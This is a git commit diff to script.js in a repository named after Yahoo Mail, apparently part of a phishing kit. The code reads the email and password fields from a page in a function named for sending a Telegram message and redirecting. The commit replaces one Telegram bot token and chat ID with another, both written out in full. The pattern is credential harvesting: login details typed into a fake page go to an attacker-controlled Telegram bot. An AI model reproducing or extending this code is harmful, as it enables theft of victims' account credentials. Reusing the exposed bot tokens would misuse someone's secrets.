782f97819aea09d360a8223f027668f813376daa
yahoomailmi <willianabbe@gmail.com>
2024-08-09 06:22:28 -0700

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,8 @@
 console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
-  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // Replace with your Telegram bot token
-  const chatId = 5349229520; // Replace with your chat ID
+  const telegramBotToken = "6567283982:AAEnrAsI1zzaLrGFULyuw-FArp4XMwJbNak"; // Replace with your Telegram bot token
+  const chatId = 6629907685; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
